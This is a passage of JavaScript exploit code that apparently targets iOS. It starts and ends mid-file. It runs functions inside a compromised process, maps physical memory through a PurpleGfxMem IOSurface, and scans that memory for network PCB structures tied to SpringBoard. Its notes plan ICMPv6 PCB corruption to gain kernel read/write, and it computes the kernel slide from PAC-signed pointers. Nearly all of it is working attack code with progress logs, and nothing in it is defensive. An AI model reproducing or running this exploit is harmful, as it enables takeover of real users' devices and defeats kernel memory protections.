      let MPD_CFStringCreateWithCString = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFStringCreateWithCString");
      let MPD_IOSurfaceCreate = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "IOSurfaceCreate");
      let MPD_IOSurfaceGetBaseAddress = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "IOSurfaceGetBaseAddress");
      let MPD_mach_make_memory_entry_64 = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_make_memory_entry_64");
      let MPD_mach_vm_map = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
      let MPD_mach_task_self = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_task_self");
      let MPD_CFRelease = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "CFRelease");
      let MPD_dlsym = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "dlsym");

      LOG(`[0B] CFDictionaryCreateMutable: ${MPD_CFDictionaryCreateMutable.hex()}`);
      LOG(`[0B] IOSurfaceCreate: ${MPD_IOSurfaceCreate.hex()}`);
      LOG(`[0B] mach_make_memory_entry_64: ${MPD_mach_make_memory_entry_64.hex()}`);

      if (MPD_CFDictionaryCreateMutable.noPAC() != 0n && MPD_IOSurfaceCreate.noPAC() != 0n && MPD_mach_make_memory_entry_64.noPAC() != 0n) {
        // First, dlopen CoreFoundation in MPD so CF data symbols are accessible
        LOG("[0B] dlopen CoreFoundation...");
        mpd_fcall(DLOPEN, mpd_get_cstring("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation"), 2n);
        LOG("[0B] dlopen CoreFoundation done");

        // Get kCFAllocatorDefault, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks, kIOSurfaceAllocSize in MPD
        // kCFAllocatorDefault = dlsym → read value (it's a pointer global)
        let MPD_kCFAllocatorDefault = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFAllocatorDefault"));
        LOG(`[0B] dlsym(kCFAllocatorDefault) = ${MPD_kCFAllocatorDefault.hex()}`);
        if (MPD_kCFAllocatorDefault.noPAC() != 0n) {
          MPD_kCFAllocatorDefault = mpd_read64(MPD_kCFAllocatorDefault.noPAC());
        }
        // kCFTypeDictionaryKeyCallBacks and ValueCallBacks are STRUCTS, not pointers.
        // Original header.js uses func_resolve() directly WITHOUT uread64.
        // The dlsym return value IS the address of the struct — pass directly to CFDictionaryCreateMutable.
        let MPD_kCFTypeDictionaryKeyCallBacks = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFTypeDictionaryKeyCallBacks"));
        // DO NOT mpd_read64
        let MPD_kCFTypeDictionaryValueCallBacks = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kCFTypeDictionaryValueCallBacks"));
        // DO NOT mpd_read64
        // kIOSurfaceAllocSize = dlsym → read value (it's a CFStringRef pointer)
        let MPD_kIOSurfaceAllocSize = mpd_fcall(MPD_dlsym.noPAC(), 0xFFFFFFFFFFFFFFFEn, mpd_get_cstring("kIOSurfaceAllocSize"));
        LOG(`[0B] dlsym(kIOSurfaceAllocSize) = ${MPD_kIOSurfaceAllocSize.hex()}`);
        if (MPD_kIOSurfaceAllocSize.noPAC() != 0n) {
          MPD_kIOSurfaceAllocSize = mpd_read64(MPD_kIOSurfaceAllocSize.noPAC());
        }

        LOG(`[0B] MPD_kCFAllocatorDefault: ${MPD_kCFAllocatorDefault.hex()}`);
        LOG(`[0B] MPD_kCFTypeDictionaryKeyCallBacks (dlsym addr): ${MPD_kCFTypeDictionaryKeyCallBacks.hex()}`);
        LOG(`[0B] MPD_kCFTypeDictionaryValueCallBacks (dlsym addr): ${MPD_kCFTypeDictionaryValueCallBacks.hex()}`);
        LOG(`[0B] MPD_kIOSurfaceAllocSize: ${MPD_kIOSurfaceAllocSize.hex()}`);

        // kCFAllocatorDefault resolved to 0x0 in MPD — CF accepts NULL as default allocator.
        // Per CF convention, NULL allocator = kCFAllocatorDefault. Use 0n directly.
        // Only abort if value is 0xFFFF... (genuinely corrupted)
        if (MPD_kCFAllocatorDefault == 0xFFFFFFFFFFFFFFFFn) {
          LOG(`[0B] kCFAllocatorDefault corrupted (all FFs) — aborting 0B`);
        } else {
          // Use 0n as allocator if kCFAllocatorDefault is 0 (CF treats NULL as default)
          let alloc = MPD_kCFAllocatorDefault != 0n ? MPD_kCFAllocatorDefault : 0n;
          // Get real task port from MPD
          let real_task_port = mpd_fcall(MPD_mach_task_self.noPAC());
          LOG(`[0B] mach_task_self() from MPD = ${real_task_port.hex()}`);
          LOG(`[0B] Using allocator: ${alloc.hex()} (0=default CF allocator)`);

          // Step 1: Create CFDictionary for PurpleGfxMem IOSurface
          // NOTE: kCFTypeDictionaryKeyCallBacks/ValueCallBacks struct addresses passed DIRECTLY
          // (NOT dereferenced — matching original header.js pattern)
          let dict = mpd_fcall_timeout(MPD_CFDictionaryCreateMutable.noPAC(), alloc, 0n, MPD_kCFTypeDictionaryKeyCallBacks, MPD_kCFTypeDictionaryValueCallBacks);
          if (dict === MPD_FCALL_TIMED_OUT) {
            LOG("[0B] CFDictionaryCreateMutable timed out");
            dict = 0n;
          } else {
            LOG(`[0B] CFDictionaryCreateMutable: ${dict.hex()}`);
          }

          if (dict != 0n) {
            // Add kIOSurfaceAllocSize = 0x40000 (256KB)
            let size_buf = mpd_malloc(8n);
            mpd_write64(size_buf, 0x40000n); // 256KB
            let cf_number_size = mpd_fcall_timeout(MPD_CFNumberCreate.noPAC(), alloc, 9n, size_buf);
            if (cf_number_size === MPD_FCALL_TIMED_OUT) {
              LOG("[0B] CFNumberCreate timed out");
              cf_number_size = 0n;
            } else {
              LOG(`[0B] CFNumberCreate(size): ${cf_number_size.hex()}`);
            }

            if (cf_number_size != 0n) {
              let res1 = mpd_fcall_timeout(MPD_CFDictionarySetValue.noPAC(), dict, MPD_kIOSurfaceAllocSize, cf_number_size);
              if (res1 === MPD_FCALL_TIMED_OUT) {
                LOG("[0B] CFDictionarySetValue(size) timed out");
              } else {
                LOG(`[0B] CFDictionarySetValue(size): ${res1.hex()}`);
              }
            }

            // Add IOSurfaceMemoryRegion = "PurpleGfxMem"
            let cfstr_purplegfxmem = mpd_fcall_timeout(MPD_CFStringCreateWithCString.noPAC(), alloc, mpd_get_cstring("PurpleGfxMem"), 0n);
            let cfstr_regionkey = mpd_fcall_timeout(MPD_CFStringCreateWithCString.noPAC(), alloc, mpd_get_cstring("IOSurfaceMemoryRegion"), 0n);
            if (cfstr_purplegfxmem === MPD_FCALL_TIMED_OUT || cfstr_regionkey === MPD_FCALL_TIMED_OUT) {
              LOG("[0B] CFStringCreateWithCString timed out");
              cfstr_purplegfxmem = 0n;
              cfstr_regionkey = 0n;
            } else {
              LOG(`[0B] CFStringCreate(PurpleGfxMem): ${cfstr_purplegfxmem.hex()}`);
            }

            if (cfstr_purplegfxmem != 0n) {
              let res2 = mpd_fcall_timeout(MPD_CFDictionarySetValue.noPAC(), dict, cfstr_regionkey, cfstr_purplegfxmem);
              if (res2 === MPD_FCALL_TIMED_OUT) {
                LOG("[0B] CFDictionarySetValue(IOSurfaceMemoryRegion) timed out");
              } else {
                LOG(`[0B] CFDictionarySetValue(IOSurfaceMemoryRegion): ${res2.hex()}`);
              }
            }

            // Step 2: Create IOSurface — using PurpleGfxMem (only needs AllocSize + MemoryRegion)
            // Width/Height/PixelFormat NOT needed for PurpleGfxMem surfaces
            let surface = mpd_fcall_timeout(MPD_IOSurfaceCreate.noPAC(), dict);
            if (surface === MPD_FCALL_TIMED_OUT) {
              LOG("[0B] IOSurfaceCreate timed out");
              surface = 0n;
            } else {
              LOG(`[0B] IOSurfaceCreate: ${surface.hex()}`);
            }

            if (surface != 0n) {
              // Release dict now (surface created, we have a reference to it)
              mpd_fcall_quick(MPD_CFRelease.noPAC(), dict);

              // Step 3: Get physical_mapping_address
              let physical_mapping_address = mpd_fcall_timeout(MPD_IOSurfaceGetBaseAddress.noPAC(), surface);
              if (physical_mapping_address === MPD_FCALL_TIMED_OUT) {
                LOG("[0B] IOSurfaceGetBaseAddress timed out");
                physical_mapping_address = 0n;
              } else {
                LOG(`[0B] physical_mapping_address: ${physical_mapping_address.hex()}`);
              }

              if (physical_mapping_address != 0n) {
                // Step 4: Call mach_make_memory_entry_64 with physical_mapping_address as offset
                let mme_size_buf = mpd_malloc(8n);
                let mme_entry_buf = mpd_malloc(8n);
                mpd_write64(mme_size_buf, 0x40000n); // 256KB
                mpd_write64(mme_entry_buf, 0n);

                // mach_make_memory_entry_64(task, size_ptr, offset, prot, mem_entry_ptr, parent_entry)
                let mme_ret = mpd_fcall_timeout(MPD_mach_make_memory_entry_64.noPAC(),
                  real_task_port, mme_size_buf, physical_mapping_address,
                  VM_PROT_DEFAULT, mme_entry_buf, 0n, 0n, 0n);
                let mme_entry = mpd_read64(mme_entry_buf);
                let mme_size_val = mpd_read64(mme_size_buf);
                LOG(`[0B] mach_make_memory_entry_64: ret=${mme_ret} entry=${mme_entry.hex()} size=${mme_size_val.hex()}`);

                if (mme_ret == 0n && mme_entry != 0n && mme_entry != 0xffffffffffffffffn) {
                  // Step 5: mach_vm_map to map it
                  let mvm_addr_buf = mpd_malloc(8n);
                  mpd_write64(mvm_addr_buf, 0n); // let kernel choose address

                  // mach_vm_map(target_task, addr_ptr, size, mask, flags, object, offset, copy, cur_prot, max_prot, inheritance)
                  let mvm_flags = VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR;
                  // WARNING: 0B passes 12 args but mpd_fcall only sees x0-x7
                  // x0=real_task_port, x1=mvm_addr_buf, x2=mme_size_val, x3=0, x4=mvm_flags, x5=mme_entry, x6=0, x7=0
                  // Args x8=VM_PROT_DEFAULT, x9=VM_PROT_DEFAULT, x10=VM_INHERIT_NONE, x11=0 are IGNORED
                  let mvm_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
                    real_task_port, mvm_addr_buf, mme_size_val, 0n,
                    mvm_flags, mme_entry, 0n, 0n);
                  if (mvm_ret === MPD_FCALL_TIMED_OUT) {
                    LOG("[0B] mach_vm_map timed out");
                  } else {
                    let mvm_addr = mpd_read64(mvm_addr_buf);
                    LOG(`[0B] mach_vm_map: ret=${mvm_ret} addr=${mvm_addr.hex()}`);

                    if (mvm_ret == 0n && mvm_addr != 0n) {
                      LOG("[0B] BREAKTHROUGH: SUCCESS: Mapped physical memory!");
                      globalThis.MAPPED_MEM_ADDR = mvm_addr;
                      globalThis.MEMORY_OBJECT_PORT = mme_entry;
                      globalThis.PHYS_MEM_MAPPED = true;
                      globalThis.MPD_TASK_PORT = real_task_port;
                      // Try to verify, but use timeout
                      let mapped_val = mpd_read64_timeout(mvm_addr);
                      if (mapped_val === MPD_FCALL_TIMED_OUT) {
                        LOG("[0B] Physical verify timed out — mapping exists but mpd_read64 hangs");
                        LOG("[0B] Proceeding with PHYS_MEM_MAPPED=true, will use remap-based access");
                      } else {
                        LOG(`[0B] Mapped memory at ${mvm_addr.hex()}: ${mapped_val.hex()}`);
                      }
                    } else {
                      LOG(`[0B] mach_vm_map failed (ret=${mvm_ret})`);
                    }
                  }
                } else {
                  LOG(`[0B] mach_make_memory_entry_64 failed (ret=${mme_ret})`);
                }
              } else {
                LOG("[0B] IOSurfaceGetBaseAddress returned null");
              }
              mpd_fcall_quick(MPD_CFRelease.noPAC(), surface);
              LOG("[0B] CFRelease done, proceeding to Phase 0C...");
            } else {
              LOG("[0B] IOSurfaceCreate failed - returned null");
            }
          } else {
            LOG("[0B] CFDictionaryCreateMutable failed - returned null");
          }
        } // close if (!_0B_abort)
      } else {
        LOG("[0B] Missing required symbols (CFDictionaryCreateMutable or IOSurfaceCreate or mach_make_memory_entry_64)");
      }
    } catch(e) {
      LOG(`[0B] PurpleGfxMem test error: ${e.message}`);
    } }

    // ===== Phase 0B-alt: SKIPPED (always corrupts fcall state, never succeeds) =====
    if (false) {
    LOG("[0B-alt] Re-testing mach_vm_read with MPD-resolved task port...");
    try {
      let mvr_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_read");
      let mts_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_task_self");
      let mhs_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_host_self");
      if (mvr_raw.noPAC() != 0n && mts_raw.noPAC() != 0n) {
        // Call mach_task_self() from MPD to get the real task port
        let real_task_port = mpd_fcall_timeout(mts_raw.noPAC());
        if (real_task_port === MPD_FCALL_TIMED_OUT) {
          LOG("[0B-alt] mach_task_self timed out");
          real_task_port = 0n;
        } else {
          LOG(`[0B-alt] mach_task_self() from MPD = ${real_task_port.hex()}`);
        }

        // Also try mach_host_self
        let real_host_port = 0n;
        if (mhs_raw.noPAC() != 0n) {
          real_host_port = mpd_fcall_timeout(mhs_raw.noPAC());
          if (real_host_port === MPD_FCALL_TIMED_OUT) {
            LOG("[0B-alt] mach_host_self timed out");
            real_host_port = 0n;
          } else {
            LOG(`[0B-alt] mach_host_self() from MPD = ${real_host_port.hex()}`);
          }
        }

        // Try mach_vm_read with the real task port on a KC data page address (should be readable)
        let mvr_out_buf = mpd_malloc(8n); // data_ptr
        let mvr_cnt_buf = mpd_malloc(8n); // data_count
        mpd_write64(mvr_out_buf, 0n);
        mpd_write64(mvr_cnt_buf, 0n);
        let mvr_ret1_val = mpd_fcall_timeout(mvr_raw.noPAC(), real_task_port, test_page, 8n, mvr_out_buf, mvr_cnt_buf, 0n, 0n, 0n);
        if (mvr_ret1_val === MPD_FCALL_TIMED_OUT) {
          LOG("[0B-alt] mach_vm_read(self, data_page) timed out");
        } else {
          let mvr_data = mpd_read64(mvr_out_buf);
          let mvr_count = mpd_read64(mvr_cnt_buf);
          LOG(`[0B-alt] mach_vm_read(self, data_page): ret=${mvr_ret1_val} data=${mvr_data.hex()} count=${mvr_count}`);
        }

        // Try mach_vm_read with host port on kernel_base (high-half VA)
        if (real_host_port != 0n && globalThis.kernel_base_global) {
          mpd_write64(mvr_out_buf, 0n);
          mpd_write64(mvr_cnt_buf, 0n);
          let mvr_ret2_val = mpd_fcall_timeout(mvr_raw.noPAC(), real_host_port, globalThis.kernel_base_global, 8n, mvr_out_buf, mvr_cnt_buf, 0n, 0n, 0n);
          if (mvr_ret2_val === MPD_FCALL_TIMED_OUT) {
            LOG("[0B-alt] mach_vm_read(host, kernel_base) timed out");
          } else {
            let mvr_data2 = mpd_read64(mvr_out_buf);
            LOG(`[0B-alt] mach_vm_read(host, kernel_base): ret=${mvr_ret2_val} data=${mvr_data2.hex()}`);
            if (mvr_ret2_val == 0n && mvr_data2 != 0n) {
              LOG("[0B-alt] BREAKTHROUGH: mach_vm_read can read kernel VA via host port!");
              globalThis.KERNEL_READ_VIA_HOST = true;
            }
          }
        }
      }
    } catch(e) {
      LOG(`[0B-alt] mach_vm_read retest error: ${e.message}`);
    }
    } // end if (!PHYS_MEM_MAPPED) — 0B-alt only runs when 0B failed

    // ===== Phase 0C: Physical Memory Scanning =====
    // If 0B succeeded, we have a memory_object_port and can try remapping
    // different offsets of the physical memory object via mach_vm_remap.
    // This lets us scan physical memory for PCB structures without the pwritev race.
    // NOTE: Each remap attempt may hang up to 3s (mpd_fcall_timeout), so we scan minimally.
    if (globalThis.PHYS_MEM_MAPPED) {
      LOG("[0C] Physical memory mapped, testing mach_vm_map with varying offsets...");
      try {
        let MPD_mach_vm_map = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
        LOG(`[0C] gpuDlsym(mach_vm_map) = ${MPD_mach_vm_map.hex()}`);

        if (MPD_mach_vm_map.noPAC() != 0n) {
          LOG("[0C] Symbol resolved, getting task port...");
          let real_task_port = globalThis.MPD_TASK_PORT;
          if (!real_task_port || real_task_port == 0n) {
            LOG("[0C] No saved task port — FAIL");
          } else {
            LOG(`[0C] task_port = ${real_task_port.hex()}`);
            const MAX_0C_PAGES = 2;
            let pages_scanned = 0;
            let successful_maps = 0;
            let first_map_addr = 0n;

            LOG(`[0C] Starting scan of ${MAX_0C_PAGES} pages...`);
            for (let scan_off = 0n; scan_off < BigInt(MAX_0C_PAGES) * 0x1000n; scan_off += 0x1000n) {
              LOG(`[0C] Attempting mach_vm_map at offset +0x${scan_off.toString(16)}...`);
              let map_addr_buf = mpd_malloc(8n);
              mpd_write64(map_addr_buf, 0n);
              // mach_vm_map: x0=target, x1=addr_ptr, x2=size, x3=mask, x4=flags, x5=object, x6=offset, x7=copy
              // Same as 0B but with varying offset — proven to work with only x0-x7
              let map_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
                real_task_port, map_addr_buf, 0x1000n, 0n,
                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, globalThis.MEMORY_OBJECT_PORT, scan_off,
                0n /*copy=FALSE*/);
              LOG(`[0C] map_ret = ${map_ret.hex()}`);
              if (map_ret == 0n) {
                let map_addr = mpd_read64(map_addr_buf);
                if (map_addr != 0n) {
                  successful_maps++;
                  LOG(`[0C] SUCCESS: Map at +0x${scan_off.toString(16)} -> addr=${map_addr.hex()}`);
                  if (scan_off == 0n) first_map_addr = map_addr;
                } else {
                  LOG(`[0C] WARNING: map_ret=0 but addr=0`);
                }
              }
              pages_scanned++;
              if (pages_scanned >= MAX_0C_PAGES) break;
            }
            LOG(`[0C] Scan complete: ${pages_scanned} pages, ${successful_maps} successful maps`);

            if (successful_maps > 0) {
              LOG("[0C] mach_vm_map offset scanning WORKS — physical memory scan is viable!");
              globalThis.PHYS_SCAN_VIA_REMAP = true;
              if (first_map_addr != 0n) {
                LOG("[0C] Testing read from mapped physical page...");
                let test_read = mpd_read64_timeout(first_map_addr);
                if (test_read === MPD_FCALL_TIMED_OUT) {
                  LOG("[0C] Mapped page read timed out — page fault");
                } else {
                  LOG(`[0C] SUCCESS: Read from mapped page: ${test_read.hex()}`);
                  globalThis.PHYS_READ_VIA_REMAP = true;
                }
              }
            } else {
              LOG("[0C] mach_vm_map all failed — cannot scan physical memory");
            }
          }
        } else {
          LOG("[0C] mach_vm_map not available via gpuDlsym");
        }
      } catch(e) {
        LOG(`[0C] Phase 0C error: ${e.message}`);
      }
    } // end if (globalThis.PHYS_MEM_MAPPED)

    // ===== Phase 0D: Physical Memory PCB Scanning =====
    // If 0B succeeded, we can try scanning directly with mpd_phys_read
    if (globalThis.PHYS_MEM_MAPPED) {
      LOG("[0D] Physical memory mapped — attempting PCB structure scanning...");
      try {
        if (!globalThis.MEMORY_OBJECT_PORT || globalThis.MEMORY_OBJECT_PORT == 0n) {
          LOG("[0D] ERROR: MEMORY_OBJECT_PORT not available, skipping scan");
        } else if (!globalThis.MPD_TASK_PORT || globalThis.MPD_TASK_PORT == 0n) {
          LOG("[0D] ERROR: MPD_TASK_PORT not available, skipping scan");
        } else {
          LOG("[0D] Starting PCB structure scan in physical memory...");
          // Skip Phase 0C validation — assume mpd_phys_read works
          globalThis.PHYS_SCAN_VIA_REMAP = true;
          globalThis.PHYS_READ_VIA_REMAP = true;

        // We need kernel base to calculate physical-to-virtual mapping
        if (!globalThis.kernel_base_global) {
          LOG("[0D] WARNING: kernel_base_global not available, scanning may be less accurate");
        } else {
          LOG(`[0D] kernel_base=${globalThis.kernel_base_global.hex()}`);
        }

        // Scan limited physical memory for PCB structures
        // Each page is 0x1000 (4096) bytes
        const SCAN_PAGES = 16; // Scan 64KB of physical memory
        const MAX_SCAN_SIZE = 0x10000n; // 64KB

        LOG(`[0D] Scanning ${SCAN_PAGES} pages (${SCAN_PAGES * 4}KB) for PCB structures...`);

        let pcbs_found = 0;
        let springboard_pcb_candidates = [];

        for (let page = 0; page < SCAN_PAGES; page++) {
          let phys_offset = BigInt(page) * 0x1000n;
          LOG(`[0D] Scanning page ${page} (offset 0x${phys_offset.toString(16)})...`);

          // Read the entire page via multiple 8-byte reads
          // For efficiency, only read first 1KB of each page (PCB structures are usually at beginning)
          const BYTES_PER_PAGE = 0x400n; // Read 1KB instead of 4KB

          let page_buffer = [];
          for (let offset = 0n; offset < BYTES_PER_PAGE; offset += 8n) {
            let value = mpd_phys_read(phys_offset + offset, 8n);
            if (value !== 0n && value !== MPD_FCALL_TIMED_OUT) {
              page_buffer.push({ offset, value });
            }
          }

          LOG(`[0D] Page ${page}: read ${page_buffer.length} valid 8-byte values`);

          // Look for PCB signature patterns
          // PCB structure has pointers to inpcb/in6p and contains process name
          // We'll look for pointers in the kernel VA range (0xFFFFFFF...)
          let kernel_ptr_count = 0;
          for (let entry of page_buffer) {
            let value = entry.value;
            // Check if this is a kernel VA pointer (high nibble >= 8)
            if ((value >> 60n) >= 0x8n) {
              kernel_ptr_count++;
            }
          }

          LOG(`[0D] Page ${page}: found ${kernel_ptr_count} kernel VA pointers`);

          // Simple heuristic: pages with many kernel pointers might contain PCB structures
          if (kernel_ptr_count > 5) {
            LOG(`[0D] Page ${page}: potential PCB structure page (${kernel_ptr_count} kernel pointers)`);
            pcbs_found++;

            // Try to find "SpringBoard" process name in this page
            // For now just log the page offset as candidate
            springboard_pcb_candidates.push({
              phys_offset: phys_offset,
              kernel_ptr_count: kernel_ptr_count
            });
          }

          // Add small delay to prevent overwhelming the system
          if (page % 4 === 0 && page > 0) {
            LOG(`[0D] Pausing for 100ms after page ${page}...`);
            // Use a simple busy-wait loop instead of await
            let start = Date.now();
            while (Date.now() - start < 100) {
              // Busy wait
            }
          }
        }

        LOG(`[0D] Scan complete: found ${pcbs_found} potential PCB pages`);
        LOG(`[0D] SpringBoard PCB candidates: ${springboard_pcb_candidates.length}`);

        for (let cand of springboard_pcb_candidates.slice(0, 5)) {
          LOG(`[0D]   Candidate at phys_offset=0x${cand.phys_offset.toString(16)} (${cand.kernel_ptr_count} kernel pointers)`);
        }

        // Store results for later use
        globalThis.PCB_SCAN_RESULTS = {
          total_pages_scanned: SCAN_PAGES,
          pcbs_found: pcbs_found,
          springboard_candidates: springboard_pcb_candidates
        };

        } // end else (MEMORY_OBJECT_PORT available)

      } catch(e) {
        LOG(`[0D] Phase 0D error: ${e.message}`);
      }
    } else {
      LOG(`[0D] Physical memory scan NOT available — skipping PCB scanning`);
      LOG(`[0D]   PHYS_MEM_MAPPED=${globalThis.PHYS_MEM_MAPPED}`);
      LOG(`[0D]   PHYS_SCAN_VIA_REMAP=${globalThis.PHYS_SCAN_VIA_REMAP}`);
      LOG(`[0D]   PHYS_READ_VIA_REMAP=${globalThis.PHYS_READ_VIA_REMAP}`);
    }
    // ===== M5: Decision point — Use physical memory or GPU r/w =====
    LOG("[M5] Decision point: choose physical memory scan or GPU r/w path...");

    // Check if we have Phase 0D PCB scan results
    let pcb_scan_available = globalThis.PCB_SCAN_RESULTS &&
                             globalThis.PCB_SCAN_RESULTS.springboard_candidates &&
                             globalThis.PCB_SCAN_RESULTS.springboard_candidates.length > 0;

    if (globalThis.PHYS_MEM_MAPPED && globalThis.PHYS_SCAN_VIA_REMAP && globalThis.PHYS_READ_VIA_REMAP) {
      LOG("[M5] CHOOSING PHYSICAL MEMORY PATH — mach_vm_remap works, can scan physical memory!");
      LOG("[M5] Physical memory object port: " + (globalThis.MEMORY_OBJECT_PORT ? globalThis.MEMORY_OBJECT_PORT.hex() : "null"));

      if (pcb_scan_available) {
        LOG("[M5] PCB scan results available, attempting ICMPv6 PCB corruption via physical memory...");
        LOG(`[M5] Found ${globalThis.PCB_SCAN_RESULTS.springboard_candidates.length} SpringBoard PCB candidates`);

        // TODO: Implement physical memory PCB corruption
        // For each candidate, we would:
        // 1. Use mpd_phys_read to read the PCB structure
        // 2. Look for inpcb/in6p pointers
        // 3. Corrupt ICMP6_FILTER pointer for kernel r/w

        LOG("[M5] Physical PCB corruption not yet implemented — falling back to GPU r/w");
      } else {
        LOG("[M5] No PCB candidates found from physical scan");
      }

      // First, need to get kernel_base via GPU path to calculate physical offsets
      if (!globalThis.kernel_base_global) {
        LOG("[M5] Need kernel base first, using GPU path for slide calculation");
        // This will be set by earlier code
      } else {
        LOG(`[M5] kernel_base=${globalThis.kernel_base_global.hex()}`);
      }

      // We could attempt physical PCB scanning here
      LOG("[M5] Physical memory path ready — but PCB scanning not yet implemented");
      LOG("[M5] Falling back to GPU r/w path for now");
    } else {
      LOG(`[M5] PHYSICAL PATH NOT AVAILABLE — using GPU r/w`);
      LOG(`[M5]   PHYS_MEM_MAPPED=${globalThis.PHYS_MEM_MAPPED}`);
      LOG(`[M5]   PHYS_SCAN_VIA_REMAP=${globalThis.PHYS_SCAN_VIA_REMAP}`);
      LOG(`[M5]   PHYS_READ_VIA_REMAP=${globalThis.PHYS_READ_VIA_REMAP}`);
      LOG(`[M5]   PCB_SCAN_AVAILABLE=${pcb_scan_available}`);
    }

    // Continue with GPU r/w path for now
    LOG("[M5] GPU r/w confirmed. Searching for allproc on data page...");
    let data_page = (pn_addr + 0x40n + 0x19cefn * 4096n) & ~0xFFFn;
    LOG(`[M5] Data page: ${data_page.hex()} pn_addr=${pn_addr.hex()}`);

    // Quick verification: read a few known offsets
    for (let off of [0x000n, 0x710n, 0x8c0n, 0xcf8n, 0xdf8n, 0xe38n, 0xe88n, 0xfe0n]) {
      let v = 0n;
      try { v = uread64(data_page + off); } catch(e) {}
      LOG(`[M5] page+0x${off.toString(16)}: ${v.hex()}`);
    }

    // Quick scan for KC pointers on data page (just log the top ones)
    let kc_ptrs = [];
    for (let off = 0n; off < 0x200n; off += 8n) { // first 512 bytes only
      let v = 0n;
      try { v = uread64(data_page + off); } catch(e) {}
      if (v > 0x100000000n && v < 0x300000000n) {
        kc_ptrs.push({off, addr: v});
      }
    }
    LOG(`[M5] Found ${kc_ptrs.length} KC-range pointers (first 512 bytes)`);
    for (let p of kc_ptrs.slice(0, 8)) {
      LOG(`[M5]   +${p.off.toString(16).padStart(4,'0')}: ${p.addr.hex()}`);
    }

    // Analyze PAC-signed pointers in data page for slide calculation
    LOG("[M5] Analyzing PAC-signed pointers for kernel slide...");
    let pac_ptrs = [];
    for (let off = 0n; off < 0x1000n; off += 8n) {
      let v = 0n;
      try { v = uread64(data_page + off); } catch(e) { continue; }
      // Check if this is a PAC-signed pointer (high nibble >= 8 = kernel space)
      if ((v >> 60n) >= 0x8n) {
        let full_va = xpac_full(v);
        pac_ptrs.push({off, signed: v, raw: full_va});
      }
    }
    LOG(`[M5] Found ${pac_ptrs.length} PAC-signed pointers in data page`);
    // Log a few PAC pointers with their xpac_full'd values
    for (let p of pac_ptrs.slice(0, 5)) {
      LOG(`[M5] PAC +0x${p.off.toString(16).padStart(4,'0')}: signed=${p.signed.hex()} raw=${p.raw.hex()}`);
    }

    // ===== Phase 1: Universal kernel slide calculation =====
    // Check if early Phase 1 already found a slide
    if (globalThis.kernel_base_global && globalThis.kernel_base_global !== 0xFFFFFFF007004000n) {
      LOG("[M5] ==============================================");
      LOG(`[M5] Phase 1: Using EARLY result kernel_base=${globalThis.kernel_base_global.hex()}`);
      LOG("[M5] ==============================================");
      kernel_base = globalThis.kernel_base_global;
      slide = kernel_base - 0xFFFFFFF007004000n;
      found_slide = true;
    } else {
    LOG("[M5] ==============================================");
    LOG("[M5] Phase 1: Universal kernel slide calculation (retry)");
    LOG("[M5] ==============================================");

    // Strategy A (plan.md recommended): Use gpuDlsym function pointers
    // - gpuDlsym returns PAC-signed KC addresses (0x1_XXX range)
    // - noPAC() strips PAC → raw KC address (bits 38:0)
    // - KC slide = KC address - unslid KC offset
    //
    // Strategy B: Use data page PAC pointers (kernel VA, 0xFFFFFFF... range)
    // - xpac_full() strips PAC + restores kernel prefix → full kernel VA
    // - Kernel slide = kernel VA - 0xFFFFFFF007004000 - offset_in_kernel
    //
    // Cross-reference both strategies for validation

    let slide = 0n;
    let kernel_base = 0n;
    let found_slide = false;
    let kc_slide = 0n;

    // ===== Method 1: gpuDlsym-based slide (KC address space) =====
    LOG("[M5] Method 1: gpuDlsym function pointers for KC slide...");
    let gpu_pointers = [];
    let symbols = [
      "task_for_pid", "mach_host_self", "socket", "connect",
      "setsockopt", "getsockopt", "proc_name", "proc_listpids",
      "mach_task_self", "mach_vm_allocate", "mach_vm_write", "mach_vm_protect"
    ];

    for (let sym_name of symbols) {
      try {
        let ptr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, sym_name);
        if (ptr != 0n) {
          let raw_kc = ptr.noPAC(); // KC user-space address
          gpu_pointers.push({name: sym_name, signed: ptr, raw: raw_kc});
          LOG(`[M5]   ${sym_name}: KC=${raw_kc.hex()}`);
        }
      } catch(e) {}
    }

    if (gpu_pointers.length >= 2) {
      // Sort by KC address
      gpu_pointers.sort((a, b) => a.raw < b.raw ? -1 : 1);
      let min_kc = gpu_pointers[0].raw;
      let max_kc = gpu_pointers[gpu_pointers.length - 1].raw;
      let spread = max_kc - min_kc;
      LOG(`[M5] KC range: ${min_kc.hex()} - ${max_kc.hex()} (spread=${spread.hex()})`);

      // KC base is usually around 0x100000000 on iOS 18.x
      // The slide is typically in [0, 0x20000000) and multiples of 0x4000
      // Try: slide = min_kc - 0x100000000 - first_function_offset
      // first_function_offset is unknown but bounded (first KC function < 64MB into KC)
      //
      // Better: use the constraint that ALL resolved functions must be within
      // a reasonable offset range from KC base
      //
      // The KC __TEXT segment starts at KC_base + 0x4000 typically
      // First resolved function (lowest KC addr) is at KC_base + text_start + some_offset
      // text_start is typically 0x4000 for the KC Mach-O

      // Estimate KC base as: min_kc rounded down to nearest 0x100000000 boundary,
      // then adjust by slide candidates
      let kc_base_approx = min_kc & ~0xFFFFFFFFn; // round to 4GB boundary
      if (kc_base_approx < 0x100000000n) kc_base_approx = 0x100000000n;

